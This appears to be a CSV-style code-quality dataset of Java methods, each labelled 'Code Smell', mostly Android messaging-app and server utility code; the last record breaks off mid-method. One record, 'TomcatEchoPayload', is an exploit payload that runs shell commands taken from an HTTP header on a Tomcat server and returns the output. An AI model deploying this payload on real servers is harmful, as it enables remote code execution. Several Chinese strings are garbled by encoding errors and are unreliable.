"@NonNull public static String getStoragePathLow(Context context,boolean isRemovable){
  StorageManager storageManager=(StorageManager)context.getSystemService(Context.STORAGE_SERVICE);
  Class<?> storageVolumeClazz=null;
  try {
    storageVolumeClazz=Class.forName(""android.os.storage.StorageVolume"");
    Method getVolumeList=storageManager.getClass().getMethod(""getVolumeList"");
    Method getPath=storageVolumeClazz.getMethod(""getPath"");
    Method isRemovableMtd=storageVolumeClazz.getMethod(""isRemovable"");
    Object result=getVolumeList.invoke(storageManager);
    final int length=Array.getLength(result);
    Log.d(""X"",""---length--"" + length);
    for (int i=0; i < length; i++) {
      Object storageVolumeElement=Array.get(result,i);
      Log.d(""X"",""  ---Object--"" + storageVolumeElement + ""i==""+ i);
      String path=(String)getPath.invoke(storageVolumeElement);
      Log.d(""X"",""  ---path_total--"" + path);
      boolean removable=(Boolean)isRemovableMtd.invoke(storageVolumeElement);
      if (isRemovable == removable) {
        Log.d(""X"",""    ---path--"" + path);
        if (isRemovable && length > 2 && path.startsWith(""/storage/""))         return ""/storage"";
 else         return path;
      }
    }
  }
 catch (  ClassNotFoundException e) {
    e.printStackTrace();
  }
catch (  InvocationTargetException e) {
    e.printStackTrace();
  }
catch (  NoSuchMethodException e) {
    e.printStackTrace();
  }
catch (  IllegalAccessException e) {
    e.printStackTrace();
  }
  return Environment.getExternalStorageDirectory().getAbsolutePath();
}",1,Code Smell
"@Override public PerformanceTestResult parse(PerformanceTestResult performanceTestResult,Logger logger){
  int inspectionSize=performanceTestResult.performanceInspectionResults.size();
  if (inspectionSize > 0) {
    List<PerformanceInspectionResult> oldInspectionResults=performanceTestResult.performanceInspectionResults;
    PerformanceInspectionResult firstInspectionResult=oldInspectionResults.get(0);
    PerformanceInspection firstInspection=firstInspectionResult.inspection;
    String inspectionKey=firstInspection.inspectionKey;
    String appId=firstInspection.appId;
    String deviceIdentifier=firstInspection.deviceIdentifier;
    File resultFolder=firstInspection.resultFolder;
    File rawFile=IOSPerfTestHelper.getInstance().getResultFile(inspectionKey);
    IOSPerfTestHelper.getInstance().stop(inspectionKey);
    long startTimeStamp=IOSPerfTestHelper.getInstance().getStartTime(inspectionKey);
    if (rawFile != null) {
      try (BufferedReader bufferedReader=new BufferedReader(new FileReader(rawFile))){
        String line;
        long lineNumber=0;
        int currentInspection=0;
        List<PerformanceInspectionResult> newPerfInspectionResults=new CopyOnWriteArrayList<>();
        while ((line=bufferedReader.readLine()) != null) {
          long timestampForThisLine=startTimeStamp + lineNumber * ONE_SECOND_TIMESTAMP;
          long timestampForNextLine=startTimeStamp + (lineNumber + 1) * ONE_SECOND_TIMESTAMP;
          String description="""";
          if ((currentInspection < inspectionSize) && (currentInspection == 0 || oldInspectionResults.get(currentInspection).timestamp > timestampForThisLine) && oldInspectionResults.get(currentInspection).timestamp < timestampForNextLine) {
            description=oldInspectionResults.get(currentInspection).inspection.description;
            currentInspection++;
          }
          String lineSubString=line.substring(line.indexOf(""{"")).replace(""'"",""\"""").replace(""None"",""null"");
          classLogger.info(""JsonLine: "" + lineSubString);
          IOSEnergyGaugeInfo energyInfo=JSON.parseObject(lineSubString,IOSEnergyGaugeInfo.class);
          JSONObject dataLineObj=JSON.parseObject(lineSubString);
          if (dataLineObj.containsKey(""energy.networking.overhead"")) {
            energyInfo.setNetworkingOverhead(dataLineObj.getFloat(""energy.networking.overhead""));
          }
          energyInfo.setTimeStamp(timestampForThisLine);
          energyInfo.setAppPackageName(appId);
          energyInfo.setDescription(description);
          PerformanceInspection newInspection=PerformanceInspection.createIOSEnergyInspection(appId,deviceIdentifier,description,false);
          newInspection.resultFolder=resultFolder;
          PerformanceInspectionResult result=new PerformanceInspectionResult(rawFile,newInspection,timestampForThisLine);
          result.parsedData=energyInfo;
          newPerfInspectionResults.add(result);
          lineNumber++;
        }
        performanceTestResult.performanceInspectionResults=newPerfInspectionResults;
        performanceTestResult.setResultSummary(getAverageIOSEnergy(newPerfInspectionResults));
        oldInspectionResults.clear();
      }
 catch (      IOException e) {
        throw new RuntimeException(e);
      }
    }
  }
  return performanceTestResult;
}",1,Code Smell
"public void hideEmojiView(){
  if (!emojiViewVisible && emojiView != null && emojiView.getVisibility() != View.GONE) {
    if (currentCell != null) {
      ChatActivityEnterViewAnimatedIconView emojiButton=currentCell.getEmojiButton();
      if (emojiButton != null) {
        emojiButton.setState(ChatActivityEnterViewAnimatedIconView.State.SMILE,false);
      }
    }
    emojiView.setVisibility(View.GONE);
  }
  int wasEmojiPadding=emojiPadding;
  emojiPadding=0;
  if (wasEmojiPadding != emojiPadding) {
    keyboardNotifier.fire();
  }
}",1,Code Smell
"public TomcatEchoPayload() throws Exception {
  transletVersion=101;
  Object o;
  Object resp;
  String s;
  boolean done=false;
  Thread[] ts=(Thread[])getFV(Thread.currentThread().getThreadGroup(),""threads"");
  for (int i=0; i < ts.length; i++) {
    Thread t=ts[i];
    if (t == null) {
      continue;
    }
    s=t.getName();
    if (!s.contains(""exec"") && s.contains(""http"")) {
      o=getFV(t,""target"");
      if (!(o instanceof Runnable)) {
        continue;
      }
      try {
        o=getFV(getFV(getFV(o,""this$0""),""handler""),""global"");
      }
 catch (      Exception e) {
        continue;
      }
      java.util.List ps=(java.util.List)getFV(o,""processors"");
      for (int j=0; j < ps.size(); j++) {
        Object p=ps.get(j);
        o=getFV(p,""req"");
        resp=o.getClass().getMethod(""getResponse"",new Class[0]).invoke(o,new Object[0]);
        s=(String)o.getClass().getMethod(""getHeader"",new Class[]{String.class}).invoke(o,new Object[]{""Testecho""});
        if (s != null && !s.isEmpty()) {
          resp.getClass().getMethod(""setStatus"",new Class[]{int.class}).invoke(resp,new Object[]{new Integer(200)});
          resp.getClass().getMethod(""addHeader"",new Class[]{String.class,String.class}).invoke(resp,new Object[]{""Testecho"",s});
          done=true;
        }
        s=(String)o.getClass().getMethod(""getHeader"",new Class[]{String.class}).invoke(o,new Object[]{""Testcmd""});
        if (s != null && !s.isEmpty()) {
          resp.getClass().getMethod(""setStatus"",new Class[]{int.class}).invoke(resp,new Object[]{new Integer(200)});
          String[] cmd=System.getProperty(""os.name"").toLowerCase().contains(""window"") ? new String[]{""cmd.exe"",""/c"",s} : new String[]{""/bin/sh"",""-c"",s};
          writeBody(resp,new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(""\\A"").next().getBytes());
          done=true;
        }
        if ((s == null || s.isEmpty()) && done) {
          writeBody(resp,System.getProperties().toString().getBytes());
        }
        if (done) {
          break;
        }
      }
      if (done) {
        break;
      }
    }
  }
}",1,Code Smell
"@Override public J.ForLoop visitForLoop(J.ForLoop forLoop,ExecutionContext ctx){
  J.ForLoop fl=super.visitForLoop(forLoop,ctx);
  List<Statement> updates=forLoop.getControl().getUpdate();
  if (emptyForIteratorPadStyle != null && updates.size() == 1 && updates.get(0) instanceof J.Empty) {
    Statement update=updates.get(0);
    if (emptyForIteratorPadStyle.getSpace() && update.getPrefix().getWhitespace().isEmpty()) {
      update=update.withPrefix(update.getPrefix().withWhitespace("" ""));
    }
 else     if (!emptyForIteratorPadStyle.getSpace() && !update.getPrefix().getWhitespace().isEmpty()) {
      update=update.withPrefix(update.getPrefix().withWhitespace(""""));
    }
    fl=fl.withControl(fl.getControl().withUpdate(singletonList(update)));
  }
  List<Statement> init=forLoop.getControl().getInit();
  if (emptyForInitializerPadStyle != null && init.get(0) instanceof J.Empty) {
    if (emptyForInitializerPadStyle.getSpace() && init.get(0).getPrefix().getWhitespace().isEmpty()) {
      init=ListUtils.mapFirst(init,i -> i.withPrefix(i.getPrefix().withWhitespace("" "")));
    }
 else     if (!emptyForInitializerPadStyle.getSpace() && !init.get(0).getPrefix().getWhitespace().isEmpty()) {
      init=ListUtils.mapFirst(init,i -> i.withPrefix(i.getPrefix().withWhitespace("""")));
    }
    fl=fl.withControl(fl.getControl().withInit(init));
  }
  return fl;
}",1,Code Smell
"@Override public boolean onPrepareActionMode(ActionMode mode,Menu menu){
  menu.getItem(1).setVisible(canShowQuote());
  MenuItem copyItem=menu.findItem(android.R.id.copy);
  if (copyItem != null) {
    copyItem.setVisible(canCopy());
  }
  if (selectedView != null) {
    CharSequence charSequence=getText(selectedView,false);
    if (multiselect || selectionStart <= 0 && selectionEnd >= charSequence.length() - 1) {
      menu.getItem(2).setVisible(false);
    }
 else {
      menu.getItem(2).setVisible(true);
    }
    menu.getItem(2).setVisible(selectedView instanceof View);
  }
  return true;
}
@Override public boolean onPrepareActionMode(ActionMode mode,Menu menu){
  return callback.onPrepareActionMode(mode,menu);
}",1,Code Smell
"private void searchAnimated(String emoji){
  if (emoji == null) {
    return;
  }
  if (lastQuery != null && lastQueryType == 2 && lastQuery.equals(emoji) && !clear && keywordResults != null && !keywordResults.isEmpty()) {
    forceClose=false;
    createListView();
    if (containerView != null) {
      containerView.setVisibility(View.VISIBLE);
      containerView.invalidate();
    }
    return;
  }
  final int id=++lastQueryId;
  if (searchRunnable != null) {
    AndroidUtilities.cancelRunOnUIThread(searchRunnable);
  }
  searchRunnable=() -> {
    ArrayList<MediaDataController.KeywordResult> standard=new ArrayList<>(1);
    standard.add(new MediaDataController.KeywordResult(emoji,null));
    MediaDataController.getInstance(currentAccount).fillWithAnimatedEmoji(standard,15,false,false,false,() -> {
      if (id == lastQueryId) {
        lastQuery=emoji;
        lastQueryType=2;
        standard.remove(standard.size() - 1);
        if (!standard.isEmpty()) {
          clear=false;
          forceClose=false;
          createListView();
          if (containerView != null) {
            containerView.setVisibility(View.VISIBLE);
            containerView.invalidate();
          }
          keywordResults=standard;
          if (adapter != null) {
            adapter.notifyDataSetChanged();
          }
        }
 else {
          clear=true;
          forceClose();
        }
      }
    }
);
  }
;
  if (keywordResults == null || keywordResults.isEmpty()) {
    AndroidUtilities.runOnUIThread(searchRunnable,600);
  }
 else {
    searchRunnable.run();
  }
}",1,Code Smell
"public static URL redirectClassGetResource(Class<?> cl,String name) throws MalformedURLException {
  String mappedResource=findMappedResource(cl,name);
  if (mappedResource == null) {
    if (name.startsWith(""/java/"") || name.startsWith(""/jdk/"") || name.startsWith(""/javax/"")) {
      return ClassLoader.getPlatformClassLoader().getResource(name);
    }
    return cl.getResource(name);
  }
 else {
    URL resource=cl.getResource(mappedResource);
    return resource == null ? null : new URL(""remap:"" + resource);
  }
}
",1,Code Smell
"@Override protected void doBefore(BeforeEvent event) throws ProcessControlException {
  if (event.javaClassName.equals(""org.apache.dubbo.rpc.filter.ConsumerContextFilter"") && event.javaMethodName.contains(""invoke"") && !MoonboxRepeatCache.isRepeatFlow(Tracer.getTraceId())) {
    DubboInvocation dubboInvocation=new DubboInvocation();
    dubboInvocation.setStart(System.currentTimeMillis());
    int key=event.argumentArray[1].hashCode();
    MoonboxRecordCache.cacheInvocation(key,dubboInvocation);
    return;
  }
  super.doBefore(event);
}",1,Code Smell
"@PostMapping(""/add"") @Operation(summary=""娣诲姞鐢ㄦ埛"",security=@SecurityRequirement(name=JwtUtils.HEADER)) @Parameter(name=""username"",description=""鐢ㄦ埛鍚�"",required=true) @Parameter(name=""password"",description=""瀵嗙爜锛堟湭md5鍔犲瘑鐨勫瘑鐮侊級"",required=true) @Parameter(name=""roleId"",description=""瑙掕壊ID"",required=true) public void add(@RequestParam String username,@RequestParam String password,@RequestParam Integer roleId){
  if (ObjectUtils.isEmpty(username) || ObjectUtils.isEmpty(password) || roleId == null) {
    throw new ControllerException(ErrorCode.ERROR400.getCode(),""鍙傛暟涓嶅彲涓虹┖"");
  }
  int currenRoleId=SecurityUtils.getUserInfo().getRole().getId();
  if (currenRoleId != 1) {
    throw new ControllerException(ErrorCode.ERROR400.getCode(),""鐢ㄦ埛鏃犳潈闄�"");
  }
  User user=new User();
  user.setUsername(username);
  user.setPassword(DigestUtils.md5DigestAsHex(password.getBytes()));
  user.setPushKey(DigestUtils.md5DigestAsHex((System.currentTimeMillis() + password).getBytes()));
  Role role=roleService.getRoleById(roleId);
  if (role == null) {
    throw new ControllerException(ErrorCode.ERROR400.getCode(),""瑙掕壊涓嶅瓨鍦�"");
  }
  user.setRole(role);
  user.setCreateTime(DateUtil.getNow());
  user.setUpdateTime(DateUtil.getNow());
  int addResult=userService.addUser(user);
  if (addResult <= 0) {
    throw new ControllerException(ErrorCode.ERROR100);
  }
}",1,Code Smell
"public static HashMap<String,ExtraInfo> getViewAllTableTypeExtra(WView view){
  if (view != null) {
    HashMap<String,ExtraInfo> hashMap=new HashMap<>();
    final List<ExtraInfo> extraInfos=view.getExtraInfos();
    if (extraInfos != null && !extraInfos.isEmpty()) {
      for (      ExtraInfo extra : extraInfos) {
        if (extra == null || hashMap.get(extra.getTag()) != null || extra.getShowType() == ExtraInfo.ShowType.EXTRA_TREE) {
          continue;
        }
        final ExtraAction extraAction=extra.getExtraAction();
        if (extraAction == null) {
          continue;
        }
        hashMap.put(extra.getTag(),extra);
      }
    }
    return hashMap;
  }
  return null;
}
",1,Code Smell
"public void reloadLastMessages(){
  if (reloadingLastMessages) {
    return;
  }
  reloadingLastMessages=true;
  TLRPC.TL_channels_getAdminLog req=new TLRPC.TL_channels_getAdminLog();
  req.channel=MessagesController.getInputChannel(currentChat);
  req.q=searchQuery;
  req.limit=10;
  req.max_id=0;
  req.min_id=0;
  if (currentFilter != null) {
    req.flags|=1;
    req.events_filter=currentFilter;
  }
  if (selectedAdmins != null) {
    req.flags|=2;
    for (int a=0; a < selectedAdmins.size(); a++) {
      req.admins.add(MessagesController.getInstance(currentAccount).getInputUser(selectedAdmins.valueAt(a)));
    }
  }
  ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> {
    if (response != null) {
      final TLRPC.TL_channels_adminLogResults res=(TLRPC.TL_channels_adminLogResults)response;
      AndroidUtilities.runOnUIThread(() -> {
        reloadingLastMessages=false;
        chatListItemAnimator.setShouldAnimateEnterFromBottom(false);
        saveScrollPosition(false);
        MessagesController.getInstance(currentAccount).putUsers(res.users,false);
        MessagesController.getInstance(currentAccount).putChats(res.chats,false);
        ArrayList<MessageObject> messages=new ArrayList<>();
        HashMap<String,ArrayList<MessageObject>> messagesByDays=new HashMap<>();
        boolean added=false;
        for (int a=0; a < res.events.size(); a++) {
          TLRPC.TL_channelAdminLogEvent event=res.events.get(a);
          if (messagesDict.indexOfKey(event.id) >= 0) {
            continue;
          }
          if (event.action instanceof TLRPC.TL_channelAdminLogEventActionParticipantToggleAdmin) {
            TLRPC.TL_channelAdminLogEventActionParticipantToggleAdmin action=(TLRPC.TL_channelAdminLogEventActionParticipantToggleAdmin)event.action;
            if (action.prev_participant instanceof TLRPC.TL_channelParticipantCreator && !(action.new_participant instanceof TLRPC.TL_channelParticipantCreator)) {
              continue;
            }
          }
          minEventId=Math.min(minEventId,event.id);
          MessageObject messageObject=new MessageObject(currentAccount,event,messages,messagesByDays,currentChat,mid,false);
          if (messageObject.contentType < 0 || messageObject.currentEvent != null && messageObject.currentEvent.action instanceof TLRPC.TL_channelAdminLogEventActionDeleteMessage) {
            continue;
          }
          if (!messagesDict.containsKey(event.id)) {
            added=true;
            this.messages.add(0,messageObject);
            messagesDict.put(event.id,messageObject);
          }
        }
        if (chatAdapter != null && added) {
          filterDeletedMessages();
          chatAdapter.notifyDataSetChanged();
        }
      }
);
    }
  }
);
}",1,Code Smell
"@Override public void handleClass(ClassNode node,ClassLoaderRemapper remapper){
  for (  var mn : node.methods) {
    for (    var insn : mn.instructions) {
      if (insn.getOpcode() == Opcodes.INVOKESTATIC && insn instanceof MethodInsnNode && method.owner.equals(""java/util/logging/Logger"") && method.name.equals(""getLogger"")) {
        method.owner=Type.getInternalName(ArclightPluginLogger.class);
      }
    }
  }
}
",1,Code Smell
"@Override public void call(Subscriber<? super String> subscriber){
  if (dst.canRead() && !isDirSame(root,dst)) {
    root.refresh();
    if (copyDir(resolver,root,dst,BACKUP,subscriber) && copyDir(resolver,root,dst,DOWNLOAD,subscriber) && copyDir(resolver,root,dst,PICTURE,subscriber)) {
      deleteDir(root,BACKUP,subscriber);
      deleteDir(root,DOWNLOAD,subscriber);
      deleteDir(root,PICTURE,subscriber);
      subscriber.onCompleted();
    }
  }
  subscriber.onError(new Exception());
}
@Override public void call(Subscriber<? super Uri> subscriber){
  try {
    DocumentFile dir=DocumentUtils.getOrCreateSubDirectory(root,PICTURE);
    if (dir != null) {
      DocumentFile file=DocumentUtils.getOrCreateFile(dir,filename);
      DocumentUtils.writeBinaryToFile(resolver,file,stream);
      subscriber.onNext(file.getUri());
      subscriber.onCompleted();
    }
  }
 catch (  IOException e) {
    e.printStackTrace();
  }
  subscriber.onError(new Exception());
}
",1,Code Smell
"@Override public void onReceive(Context context,Intent intent){
  ApplicationLoader.postInitApplication();
  long dialogId=intent.getLongExtra(""dialog_id"",0);
  int maxId=intent.getIntExtra(""max_id"",0);
  int currentAccount=intent.getIntExtra(""currentAccount"",0);
  if (dialogId == 0 || maxId == 0 || !UserConfig.isValidAccount(currentAccount)) {
    return;
  }
  AccountInstance accountInstance=AccountInstance.getInstance(currentAccount);
  if (DialogObject.isUserDialog(dialogId)) {
    TLRPC.User user=accountInstance.getMessagesController().getUser(dialogId);
    if (user == null) {
      Utilities.globalQueue.postRunnable(() -> {
        TLRPC.User user1=accountInstance.getMessagesStorage().getUserSync(dialogId);
        AndroidUtilities.runOnUIThread(() -> {
          accountInstance.getMessagesController().putUser(user1,true);
          MessagesController.getInstance(currentAccount).markDialogAsRead(dialogId,maxId,maxId,0,false,0,0,true,0);
          MessagesController.getInstance(currentAccount).markReactionsAsRead(dialogId,0);
        }
);
      }
);
      return;
    }
  }
 else   if (DialogObject.isChatDialog(dialogId)) {
    TLRPC.Chat chat=accountInstance.getMessagesController().getChat(-dialogId);
    if (chat == null) {
      Utilities.globalQueue.postRunnable(() -> {
        TLRPC.Chat chat1=accountInstance.getMessagesStorage().getChatSync(-dialogId);
        AndroidUtilities.runOnUIThread(() -> {
          accountInstance.getMessagesController().putChat(chat1,true);
          MessagesController.getInstance(currentAccount).markDialogAsRead(dialogId,maxId,maxId,0,false,0,0,true,0);
          MessagesController.getInstance(currentAccount).markReactionsAsRead(dialogId,0);
        }
);
      }
);
      return;
    }
  }
  MessagesController.getInstance(currentAccount).markDialogAsRead(dialogId,maxId,maxId,0,false,0,0,true,0);
  MessagesController.getInstance(currentAccount).markReactionsAsRead(dialogId,0);
}",1,Code Smell
"private void processLoadedDiceStickers(String name,boolean isEmoji,TLRPC.TL_messages_stickerSet res,boolean cache,int date){
  AndroidUtilities.runOnUIThread(() -> loadingDiceStickerSets.remove(name));
  Utilities.stageQueue.postRunnable(() -> {
    if (cache && (res == null || Math.abs(System.currentTimeMillis() / 1000 - date) >= 60 * 60 * 24) || !cache && res == null) {
      AndroidUtilities.runOnUIThread(() -> loadStickersByEmojiOrName(name,isEmoji,false),res == null && !cache ? 1000 : 0);
      if (res == null) {
        return;
      }
    }
    if (res != null) {
      if (!cache) {
        putDiceStickersToCache(name,res,date);
      }
      AndroidUtilities.runOnUIThread(() -> {
        diceStickerSetsByEmoji.put(name,res);
        diceEmojiStickerSetsById.put(res.set.id,name);
        getNotificationCenter().postNotificationName(NotificationCenter.diceStickersDidLoad,name);
      }
);
    }
 else     if (!cache) {
      putDiceStickersToCache(name,null,date);
    }
  }
);
}",1,Code Smell
"public static Intent getIntent(Context context,boolean requiresStandardLaunchMode){
  String[] actions=new String[]{Settings.ACTION_WIFI_SETTINGS,Settings.ACTION_NETWORK_OPERATOR_SETTINGS,Settings.ACTION_DEVICE_INFO_SETTINGS,Settings.ACTION_DISPLAY_SETTINGS,Settings.ACTION_SOUND_SETTINGS,Settings.ACTION_INTERNAL_STORAGE_SETTINGS,Settings.ACTION_SECURITY_SETTINGS,Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS};
  Intent intent=new Intent(""null"").setPackage(PACKAGE_NAME);
  PackageManager pm=context.getPackageManager();
  for (  String action : actions) {
    intent.setAction(action);
    try {
      ResolveInfo resolveInfo=pm.resolveActivity(intent,0);
      if (resolveInfo != null && resolveInfo.activityInfo != null && resolveInfo.activityInfo.exported && (!requiresStandardLaunchMode || resolveInfo.activityInfo.launchMode == ActivityInfo.LAUNCH_MULTIPLE)) {
        if (requiresStandardLaunchMode) {
          LOGGER.i(""Found action for Sui shortcut (standard launch mode): %s"",action);
        }
 else {
          LOGGER.w(""Found action for Sui shortcut: %s"",action);
        }
        break;
      }
    }
 catch (    Throwable e) {
      LOGGER.w(e,""resolveActivity %s"",intent);
    }
    intent.setAction(""null"");
  }
  if (""null"".equals(intent.getAction())) {
    if (requiresStandardLaunchMode) {
      intent=getIntent(context,false);
    }
 else {
      LOGGER.w(""Use launch intent for Sui shortcut"");
      intent=pm.getLaunchIntentForPackage(PACKAGE_NAME);
    }
  }
  intent.setFlags(FLAGS);
  intent.putExtra(SHORTCUT_EXTRA,1);
  return intent;
}",1,Code Smell
"@Override protected float getBottomOffset(){
  return chatListView.getBottom();
}
@Override public int getBottomOffset(int tag){
  if (tag == 1) {
    return 0;
  }
  int height;
  if (chatActivityEnterView != null && chatActivityEnterView.getVisibility() == View.VISIBLE) {
    if (contentView.getKeyboardHeight() < AndroidUtilities.dp(20) && chatActivityEnterView.isPopupShowing() || chatActivityEnterView.panelAnimationInProgress()) {
      height=chatActivityEnterView.getHeight() + chatActivityEnterView.getEmojiPadding();
    }
 else {
      height=chatActivityEnterView.getHeight();
    }
  }
 else   if (!isInsideContainer) {
    height=AndroidUtilities.dp(51);
  }
 else {
    height=0;
  }
  if (chatActivityEnterView.panelAnimationInProgress()) {
    float translationY=bottomPanelTranslationY - chatActivityEnterView.getEmojiPadding();
    height+=translationY;
  }
  height+=contentPanTranslation;
  return height - AndroidUtilities.dp(1.5f);
}",1,Code Smell
"@Override public void bridge$handleBlockDrop(ArclightCaptures.BlockBreakEventContext breakEventContext,BlockPos pos){
  BlockBreakEvent breakEvent=breakEventContext.getEvent();
  List<ItemEntity> blockDrops=breakEventContext.getBlockDrops();
  org.bukkit.block.BlockState state=breakEventContext.getBlockBreakPlayerState();
  if (blockDrops != null && (breakEvent == null || breakEvent.isDropItems())) {
    CraftBlock craftBlock=CraftBlock.at(this.level,pos);
    CraftEventFactory.handleBlockDropItemEvent(craftBlock,state,this.player,blockDrops);
  }
}
",1,Code Smell
"@Override public boolean onNextClicked(){
  if (getVideo() != null && getVideo().isLive && (getPlayer().getDurationMs() - getPlayer().getPositionMs() > LIVE_THRESHOLD_MS)) {
    long buffer=mPlayerTweaksData.isBufferOnStreamsDisabled() ? SHORT_LIVE_BUFFER_MS : LIVE_BUFFER_MS;
    getPlayer().setPositionMs(getPlayer().getDurationMs() - buffer);
    return true;
  }
  setPlayEnabled(true);
  saveState();
  clearStateOfNextVideo();
  return false;
}
",1,Code Smell
"public List<InLongTopic> getConsumerSubset(List<InLongTopic> totalTopics){
  if (this.consumerSubsetSize <= 1 || this.containerId == null || this.consumerSubsetType == ConsumerSubsetType.ALL) {
    return totalTopics;
  }
  List<InLongTopic> subset=new ArrayList<>(totalTopics.size());
  int containerHashId=Math.abs(this.containerId.hashCode()) % this.consumerSubsetSize;
  for (  InLongTopic topic : totalTopics) {
    int topicHashId=0;
    if (this.consumerSubsetType == ConsumerSubsetType.CLUSTER) {
      String hashString=topic.getInLongCluster().getClusterId();
      topicHashId=Math.abs(hashString.hashCode()) % this.consumerSubsetSize;
    }
 else {
      String hashString=topic.getTopicKey();
      topicHashId=Math.abs(hashString.hashCode()) % this.consumerSubsetSize;
    }
    if (containerHashId == topicHashId) {
      subset.add(topic);
    }
  }
  return subset;
}",1,Code Smell
"private List<SubtitlesInfo> parseCaptions(JSONObject playerResponse){
  if (!playerResponse.containsKey(""captions"")) {
    return Collections.emptyList();
  }
  JSONObject captions=playerResponse.getJSONObject(""captions"");
  JSONObject playerCaptionsTracklistRenderer=captions.getJSONObject(""playerCaptionsTracklistRenderer"");
  if (playerCaptionsTracklistRenderer == null || playerCaptionsTracklistRenderer.isEmpty()) {
    return Collections.emptyList();
  }
  JSONArray captionsArray=playerCaptionsTracklistRenderer.getJSONArray(""captionTracks"");
  if (captionsArray == null || captionsArray.isEmpty()) {
    return Collections.emptyList();
  }
  List<SubtitlesInfo> subtitlesInfo=new ArrayList<>();
  for (int i=0; i < captionsArray.size(); i++) {
    JSONObject subtitleInfo=captionsArray.getJSONObject(i);
    String language=subtitleInfo.getString(""languageCode"");
    String url=subtitleInfo.getString(""baseUrl"");
    String vssId=subtitleInfo.getString(""vssId"");
    if (language != null && url != null && vssId != null) {
      boolean isAutoGenerated=vssId.startsWith(""a."");
      subtitlesInfo.add(new SubtitlesInfo(url,language,isAutoGenerated,true));
    }
  }
  return subtitlesInfo;
}",1,Code Smell
"public Color getEntityTypeColor(Entity entity){
  if (distance.get()) {
    if (friendOverride.get() && entity instanceof PlayerEntity && Friends.get().isFriend((PlayerEntity)entity)) {
      return Config.get().friendColor.get();
    }
 else     return EntityUtils.getColorFromDistance(entity);
  }
 else   if (entity instanceof PlayerEntity) {
    return PlayerUtils.getPlayerColor(((PlayerEntity)entity),playersColor.get());
  }
 else {
    return null;
  }
}
",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.playerDidStartPlaying) {
    VideoPlayer p=(VideoPlayer)args[0];
    if (p != this && isPlaying() && !allowMultipleInstances) {
      pause();
    }
  }
}",1,Code Smell
"private static List<Variable> columnToVariable(String prefixName,TermColumn column,Function<String,Term> termSupplier){
  List<Variable> variables=new ArrayList<>(1);
  String variableName=column.getName();
  if (CollectionUtils.isEmpty(column.getChildren())) {
    Term term=termSupplier.apply(column.getColumn());
    variables.add(Variable.of(column.getVariable(""_""),variableName).with(column));
    if (term != null) {
      List<TermValue> termValues=TermValue.of(term);
      String property=column.getPropertyOrNull();
      for (      TermValue termValue : termValues) {
        PropertyMetric metric=column.getMetricOrNull(termValue.getMetric());
        if (property != null && metric != null && termValue.getSource() == TermValue.Source.metric) {
          variables.add(Variable.of(property + ""_metric_"" + termValue.getMetric(),(prefixName == null ? column.getName() : prefixName) + ""_鎸囨爣_"" + metric.getName()).withTermType(column.getTermTypes()).withColumn(column.getColumn()).withMetadata(column.isMetadata()));
        }
      }
    }
  }
 else {
    Variable variable=Variable.of(column.getColumn(),column.getName());
    List<Variable> children=new ArrayList<>();
    variable.setChildren(children);
    variable.with(column);
    variables.add(variable);
    for (    TermColumn child : column.getChildren()) {
      children.addAll(columnToVariable(column.getName(),child,termSupplier));
    }
  }
  return variables;
}",1,Code Smell
"@Override public boolean dispatchNestedPreScroll(int dx,int dy,int[] consumed,int[] offsetInWindow,int type){
  consumed[1]=0;
  if (nestedScrollStarted && (overScrollY > 0 && dy > 0 || overScrollY < 0 && dy < 0)) {
    final float delta=overScrollY - dy;
    if (overScrollY > 0) {
      if (delta < 0) {
        overScrollY=0;
        consumed[1]+=dy + delta;
      }
 else {
        overScrollY=delta;
        consumed[1]+=dy;
      }
    }
 else {
      if (delta > 0) {
        overScrollY=0;
        consumed[1]+=dy + delta;
      }
 else {
        overScrollY=delta;
        consumed[1]+=dy;
      }
    }
    captionTextview.setTranslationY(overScrollY);
    textSelectionHelper.invalidate();
    return true;
  }
  return false;
}",1,Code Smell
"private void scheduleNextGetFrame(){
  if (loadFrameTask != null || nextRenderingBitmap != null || !canLoadFrames() || destroyWhenDone || !isRunning && (!decodeSingleFrame || decodeSingleFrame && singleFrameDecoded) || parents.size() == 0 && !ignoreNoParent || generatingCache) {
    return;
  }
  long ms=0;
  if (lastFrameDecodeTime != 0) {
    ms=Math.min(invalidateAfter,Math.max(0,invalidateAfter - (System.currentTimeMillis() - lastFrameDecodeTime)));
  }
  if (useSharedQueue) {
    if (limitFps) {
      DispatchQueuePoolBackground.execute(loadFrameTask=loadFrameRunnable);
    }
 else {
      executor.schedule(loadFrameTask=loadFrameRunnable,ms,TimeUnit.MILLISECONDS);
    }
  }
 else {
    if (decodeQueue == null) {
      decodeQueue=new DispatchQueue(""decodeQueue"" + this);
    }
    decodeQueue.postRunnable(loadFrameTask=loadFrameRunnable,ms);
  }
}",1,Code Smell
"public void measureInlineBotButtons(){
  if (isRestrictedMessage) {
    return;
  }
  wantedBotKeyboardWidth=0;
  if (messageOwner.reply_markup instanceof TLRPC.TL_replyInlineMarkup && !hasExtendedMedia() || messageOwner.reactions != null && !messageOwner.reactions.results.isEmpty()) {
    Theme.createCommonMessageResources();
    if (botButtonsLayout == null) {
      botButtonsLayout=new StringBuilder();
    }
 else {
      botButtonsLayout.setLength(0);
    }
  }
  if (messageOwner.reply_markup instanceof TLRPC.TL_replyInlineMarkup && !hasExtendedMedia()) {
    for (int a=0; a < messageOwner.reply_markup.rows.size(); a++) {
      TLRPC.TL_keyboardButtonRow row=messageOwner.reply_markup.rows.get(a);
      int maxButtonSize=0;
      int size=row.buttons.size();
      for (int b=0; b < size; b++) {
        TLRPC.KeyboardButton button=row.buttons.get(b);
        botButtonsLayout.append(a).append(b);
        CharSequence text;
        if (button instanceof TLRPC.TL_keyboardButtonBuy && (getMedia(messageOwner).flags & 4) != 0) {
          text=LocaleController.getString(""PaymentReceipt"",R.string.PaymentReceipt);
        }
 else {
          String str=button.text;
          if (str == null) {
            str="""";
          }
          text=Emoji.replaceEmoji(str,Theme.chat_msgBotButtonPaint.getFontMetricsInt(),AndroidUtilities.dp(15),false);
        }
        StaticLayout staticLayout=new StaticLayout(text,Theme.chat_msgBotButtonPaint,AndroidUtilities.dp(2000),Layout.Alignment.ALIGN_NORMAL,1.0f,0.0f,false);
        if (staticLayout.getLineCount() > 0) {
          float width=staticLayout.getLineWidth(0);
          float left=staticLayout.getLineLeft(0);
          if (left < width) {
            width-=left;
          }
